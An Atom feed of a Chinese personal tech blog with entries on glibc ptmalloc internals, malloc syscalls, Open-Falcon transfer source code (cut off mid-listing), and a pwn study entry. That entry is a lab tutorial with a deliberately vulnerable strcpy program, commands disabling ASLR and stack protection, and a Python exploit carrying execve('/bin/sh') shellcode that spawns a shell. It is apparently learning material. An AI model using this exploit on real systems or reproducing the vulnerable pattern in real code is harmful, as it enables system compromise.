<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Saar&#39;s Blog</title>
  
  <subtitle>不忘初心 方得始终</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.mydreamdll.xyz/"/>
  <updated>2020-01-26T11:02:04.000Z</updated>
  <id>http://www.mydreamdll.xyz/</id>
  
  <author>
    <name>Saar</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ptmalloc学习</title>
    <link href="http://www.mydreamdll.xyz/2020/01/26/ptmalloc%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/26/ptmalloc%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-26T11:02:18.842Z</published>
    <updated>2020-01-26T11:02:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ptmalloc学习"><a href="#ptmalloc学习" class="headerlink" title="ptmalloc学习"></a>ptmalloc学习</h2><p>ptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用的dlmalloc，现在逐步都被支持多线程的ptmalloc来替代了。</p><p>我们之前学习过系统底层是调用的brk和mmap来实现内存分配的。</p><p>ptmalloc2多线程情况下分配内存的时候，每个线程有一个独立的heap segment和freelist数据结构保持于其他堆独立。这个行为我们称作为per thread arena;</p><p>需要注意的是，即使用户请求内存只有1000字节，堆内存分配的时候还是会提供132KB大小被创建。这种连续的堆内存区域我们称作为arena。主线程创建的我们称作为main arena;</p><p>如果当程序超过了这个arena区域可用空寂哦哦安的时候，他能够增加通过程序break位置的方式。top chunk大小可以适配 extra space空间。类似的如果有很多可用空间在top chunk中的时候，他可以缩小。</p><p>除了这个1ＭＢ的堆分配外，只有132KB的读写权限被设置，因此这个连续的内存区域被称作为thread arena;如果超过128KB（132*1024）请求大小，超过了malloc可用空间的时候，内存分配通过使用mmap系统调用来申请，无论请求来自于main arena还是thread arena; arena的限制来自于系统的cores数目；</p><p>32bit: Number of arena = 2 * number of cores;</p><p>63bit: Number of arena = 8 * number of cores;</p><p>heap的主要信息有下面这些：</p><p>heap_info： heap header信息，单线程thread arena能有多堆。</p><p>malloc_state: arena header</p><p>malloc_chunk:  chunk_header</p><p>main arena因为没有多heap，所以没有heap_info。不像thread arena，main arena header不是sbrk的 heap segment的一部分。他是一个全局变量，因此可以在libc.so data segment找到。</p><p><img src="https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720" alt="img"></p><p><img src="https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720" alt="img"></p><p><img src="https://docs.google.com/drawings/d/150bTi0uScQlnABDImLYS8rWyL82mmfpMxzRbx-45UKw/pub?w=960&h=720" alt="img"></p><p>chunk: 一个chunk包含在一个heap segment中，包括以下几个：</p><ol><li><p>allocated chunk</p><p><img src="https://docs.google.com/drawings/d/1eLkG-WF9U3O_ytNs6iFKHacqkjWZeY4KtLqxmd01EVs/pub?w=962&h=682" alt="img"></p></li><li><p>free chunk</p><p><img src="https://docs.google.com/drawings/d/1YrlnGa081NpO0D3wcoaJbGvhnPi3X6bBKMc3bN4-oZQ/pub?w=940&h=669" alt="img"></p><p>其中 bins是freelist的数据结构，在free chunk中被使用。</p><p>fast bin, unsorted bin, small bin, large bin</p><p>fastbinsY： 这个数组支持fastbins</p><p>bins: bin1  unsorted bin, bin2-bin63 small bin, bin64-bin126 large bin;</p><p>fastbin: chunk大小在16-80字节被称作为fast chunk;</p><p><img src="https://docs.google.com/drawings/d/144diIfbLqUmOPlAWbtP45mGsZlIl3PZWJvvH-cvQziU/pub?w=960&h=720" alt="img"></p><p>unsorted bin: </p><p>当释放小块或大块时，而不是将它们添加到各自的容器，将他们释放的空间放入unsortedbin中。这种方式给了glibc malloc重用最近释放的chunk的机会。因此，内存分配和释放会加快一点。因为寻找合适的垃圾箱所花费的时间减少了。</p><p><img src="https://docs.google.com/drawings/d/1Kf_eg7uB2mRjSOasTc4dIu5fuBpTAK0GxbnKVTkZd0Y/pub?w=1217&h=865" alt="img"></p><p>small bin: chunk小于512字节的被称作为small chunk;</p><p>large bin: chunk大于512字节的被称作为large chunk;</p></li><li><p>Top Chunk：</p><p>在top边界上的arena被称作为top chunk;</p></li><li><p>Last Remainder Chunk：</p><p>从最近的一个小请求分裂。最后的剩余块有助于改善引用的局部性，即小块的连续的malloc请求可能最终被分配到彼此接近的地方。</p></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p><p><a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5486458.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ptmalloc学习&quot;&gt;&lt;a href=&quot;#ptmalloc学习&quot; class=&quot;headerlink&quot; title=&quot;ptmalloc学习&quot;&gt;&lt;/a&gt;ptmalloc学习&lt;/h2&gt;&lt;p&gt;ptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用
      
    
    </summary>
    
    
      <category term="malloc" scheme="http://www.mydreamdll.xyz/categories/malloc/"/>
    
    
      <category term="malloc" scheme="http://www.mydreamdll.xyz/tags/malloc/"/>
    
  </entry>
  
  <entry>
    <title>Linux Malloc底层分配原理【翻译】</title>
    <link href="http://www.mydreamdll.xyz/2020/01/24/linux%E5%86%85%E5%AD%98malloc%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/24/linux%E5%86%85%E5%AD%98malloc%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-01-24T06:56:22.335Z</published>
    <updated>2020-01-24T06:56:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-Malloc底层分配原理【翻译】"><a href="#Linux-Malloc底层分配原理【翻译】" class="headerlink" title="Linux Malloc底层分配原理【翻译】"></a>Linux Malloc底层分配原理【翻译】</h2><p>linux中malloc函数还是通过syscall来分配内存的。通过调用brk或者mmap syscall函数来分配内存。</p><p><img src="https://docs.google.com/drawings/d/105HDvkEvIW2lsyaQjj758Lbyx6A-_K7jviheyzeAwl8/pub?w=480&h=238" alt="img"></p><p>brk函数：从内核分配内存（非0初始化）通过增加程序break位置来实现。初始化堆segment得开始与结束指向相同的位置。</p><p>如果ASLR关闭的时候，start_brk和brk将指向data/bss segment结束的位置。</p><p>如果ASLR打开的时候，start_brk和brk将等于data/bss segment结束的位置通过随机brk offset</p><p><img src="https://i2.wp.com/static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png" alt="img"></p><p>mmap: malloc函数使用mmap来创建一个私有匿名映射segment.分配私有匿名的主要目的是分配一个新的内存（0填充的）这个新的内存将被调用进程的时候额外使用。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a></p><p><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/" target="_blank" rel="noopener">https://manybutfinite.com/post/anatomy-of-a-program-in-memory/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux-Malloc底层分配原理【翻译】&quot;&gt;&lt;a href=&quot;#Linux-Malloc底层分配原理【翻译】&quot; class=&quot;headerlink&quot; title=&quot;Linux Malloc底层分配原理【翻译】&quot;&gt;&lt;/a&gt;Linux Malloc底层分配原理【翻
      
    
    </summary>
    
    
      <category term="malloc" scheme="http://www.mydreamdll.xyz/categories/malloc/"/>
    
    
      <category term="malloc" scheme="http://www.mydreamdll.xyz/tags/malloc/"/>
    
  </entry>
  
  <entry>
    <title>pwn学习笔记1</title>
    <link href="http://www.mydreamdll.xyz/2020/01/23/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.mydreamdll.xyz/2020/01/23/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-01-23T03:05:13.595Z</published>
    <updated>2020-01-23T03:04:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn学习笔记1"><a href="#pwn学习笔记1" class="headerlink" title="pwn学习笔记1"></a>pwn学习笔记1</h2><h3 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h3><p>其实参考的是<a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。</a></p><p>环境：ubuntu14.04</p><p>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* [1] */</span> <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">        <span class="comment">/* [2] */</span> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">/* [3] */</span> <span class="built_in">printf</span>(<span class="string">"Input:%s\n"</span>,buf);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是简单的栈溢出利用，超过256个字符的时候会发生栈溢出问题。</p><p>首先我们需要关闭内存地址随机化。保证栈溢出地址固定。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; <span class="regexp">/proc/sys</span><span class="regexp">/kernel/randomize</span>_va_space</span><br></pre></td></tr></table></figure><p>编译和打开栈执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack -o vul1 vul1.c</span><br><span class="line">chmod +s vul1</span><br></pre></td></tr></table></figure><p>gdb调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">saar@saar-virtual-machine:~/pwn$ gdb vul1 </span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</span><br><span class="line">Copyright (C) 2014 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type "show copying"</span><br><span class="line">and "show warranty" for details.</span><br><span class="line">This GDB was configured as "i686-linux-gnu".</span><br><span class="line">Type "show configuration" for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type "help".</span><br><span class="line">Type "apropos word" to search for commands related to "word"...</span><br><span class="line">Reading symbols from vul1...done.</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> dis</span></span><br><span class="line">disable      disassemble  disconnect   display      distance     </span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disassemble main</span></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0804844d &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x0804844e &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x08048450 &lt;+3&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x08048453 &lt;+6&gt;:     sub    esp,0x110</span><br><span class="line">   0x08048459 &lt;+12&gt;:    mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">   0x0804845c &lt;+15&gt;:    add    eax,0x4</span><br><span class="line">   0x0804845f &lt;+18&gt;:    mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x08048461 &lt;+20&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048465 &lt;+24&gt;:    lea    eax,[esp+0x10]</span><br><span class="line">   0x08048469 &lt;+28&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804846c &lt;+31&gt;:    call   0x8048320 &lt;strcpy@plt&gt;</span><br><span class="line">   0x08048471 &lt;+36&gt;:    lea    eax,[esp+0x10]</span><br><span class="line">   0x08048475 &lt;+40&gt;:    mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x08048479 &lt;+44&gt;:    mov    DWORD PTR [esp],0x8048520</span><br><span class="line">   0x08048480 &lt;+51&gt;:    call   0x8048310 &lt;printf@plt&gt;</span><br><span class="line">   0x08048485 &lt;+56&gt;:    mov    eax,0x0</span><br><span class="line">   0x0804848a &lt;+61&gt;:    leave  </span><br><span class="line">   0x0804848b &lt;+62&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> r `python -c <span class="string">'print "A"*400'</span>`</span></span><br><span class="line">Starting program: /home/saar/pwn/vul1 `python -c 'print "A"*400'`</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0xb7fc0000 --&gt; 0x1acda8 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0xb7fc1898 --&gt; 0x0 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x41414141 ('AAAA')</span><br><span class="line">ESP: 0xbffff460 ('A' &lt;repeats 128 times&gt;)</span><br><span class="line">EIP: 0x41414141 ('AAAA')</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff460 ('A' &lt;repeats 128 times&gt;)</span><br><span class="line">0004| 0xbffff464 ('A' &lt;repeats 124 times&gt;)</span><br><span class="line">0008| 0xbffff468 ('A' &lt;repeats 120 times&gt;)</span><br><span class="line">0012| 0xbffff46c ('A' &lt;repeats 116 times&gt;)</span><br><span class="line">0016| 0xbffff470 ('A' &lt;repeats 112 times&gt;)</span><br><span class="line">0020| 0xbffff474 ('A' &lt;repeats 108 times&gt;)</span><br><span class="line">0024| 0xbffff478 ('A' &lt;repeats 104 times&gt;)</span><br><span class="line">0028| 0xbffff47c ('A' &lt;repeats 100 times&gt;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414141 in ?? ()</span><br></pre></td></tr></table></figure><p>esp 地址是：0xbffff460，</p><p>发现ret_address需要保证esp+N&lt;nop的数目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line"><span class="comment">#Stack address where shellcode is copied.</span></span><br><span class="line">ret_addr = <span class="number">0xbffff480</span>      </span><br><span class="line">              </span><br><span class="line"><span class="comment">#Spawn a shell</span></span><br><span class="line"><span class="comment">#execve(/bin/sh)</span></span><br><span class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endianess convertion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span></span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf = Junk + RA + NOP's + Shellcode</span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></span><br><span class="line">buf += conv(ret_addr)</span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">40</span></span><br><span class="line">buf += scode</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span></span><br><span class="line">call([<span class="string">"./vul1"</span>, buf])</span><br></pre></td></tr></table></figure><p>最后获取shell:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">saar@saar-virtual-machine:~/pwn$ python exp.py </span><br><span class="line">Calling vulnerable program</span><br><span class="line">Input:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1/shh/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> id</span></span><br><span class="line">uid=1000(saar) gid=1000(saar) groups=1000(saar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.jianshu.com/p/187b810e78d2" target="_blank" rel="noopener">https://www.jianshu.com/p/187b810e78d2</a></p><p><a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwn学习笔记1&quot;&gt;&lt;a href=&quot;#pwn学习笔记1&quot; class=&quot;headerlink&quot; title=&quot;pwn学习笔记1&quot;&gt;&lt;/a&gt;pwn学习笔记1&lt;/h2&gt;&lt;h3 id=&quot;学习笔记&quot;&gt;&lt;a href=&quot;#学习笔记&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://www.mydreamdll.xyz/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://www.mydreamdll.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon transfer 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/transfer%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/transfer%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:46.621Z</published>
    <updated>2020-01-21T09:06:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-transfer-源码分析"><a href="#open-falcon-transfer-源码分析" class="headerlink" title="open-falcon transfer 源码分析"></a>open-falcon transfer 源码分析</h2><p>transfer模块是小米监控中比较重要的环境，主要用于发送数据给graph,judge,等。</p><p>主要流程在modules/transfer/main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"configuration file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">versionGit := flag.Bool(<span class="string">"vg"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *versionGit &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// global config</span></span><br><span class="line">    <span class="comment">// 解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"><span class="comment">// proc</span></span><br><span class="line">    <span class="comment">// 就是打印日志。。orz</span></span><br><span class="line">proc.Start()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送端启动</span></span><br><span class="line">sender.Start()</span><br><span class="line">    <span class="comment">// 接收数据启动</span></span><br><span class="line">receiver.Start()</span><br><span class="line"></span><br><span class="line"><span class="comment">// http</span></span><br><span class="line">    <span class="comment">//  http服务启动</span></span><br><span class="line">http.Start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看下发送端的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化数据发送服务, 在main函数中调用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 初始化默认参数</span></span><br><span class="line">MinStep = g.Config().MinStep</span><br><span class="line"><span class="keyword">if</span> MinStep &lt; <span class="number">1</span> &#123;</span><br><span class="line">MinStep = <span class="number">30</span> <span class="comment">//默认30s</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化连接池</span></span><br><span class="line">initConnPools()</span><br><span class="line">    <span class="comment">//初始化发送队列</span></span><br><span class="line">initSendQueues()</span><br><span class="line"><span class="comment">//初始化hash环，用于做一致性hash分片</span></span><br><span class="line">    initNodeRings()</span><br><span class="line"><span class="comment">// SendTasks依赖基础组件的初始化,要最后启动</span></span><br><span class="line">startSendTasks()</span><br><span class="line">    <span class="comment">//启动发送定时任务</span></span><br><span class="line">startSenderCron()</span><br><span class="line">log.Println(<span class="string">"send.Start, ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initConnPools</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line"></span><br><span class="line"><span class="comment">// judge</span></span><br><span class="line">    <span class="comment">// 读取配置文件，加载进来</span></span><br><span class="line">judgeInstances := nset.NewStringSet()</span><br><span class="line"><span class="keyword">for</span> _, instance := <span class="keyword">range</span> cfg.Judge.Cluster &#123;</span><br><span class="line">judgeInstances.Add(instance)</span><br><span class="line">&#125;</span><br><span class="line">JudgeConnPools = backend.CreateSafeRpcConnPools(cfg.Judge.MaxConns, cfg.Judge.MaxIdle,</span><br><span class="line">cfg.Judge.ConnTimeout, cfg.Judge.CallTimeout, judgeInstances.ToSlice())</span><br><span class="line"></span><br><span class="line"><span class="comment">// tsdb，是否开启tsdb，初始化</span></span><br><span class="line"><span class="keyword">if</span> cfg.Tsdb.Enabled &#123;</span><br><span class="line">TsdbConnPoolHelper = 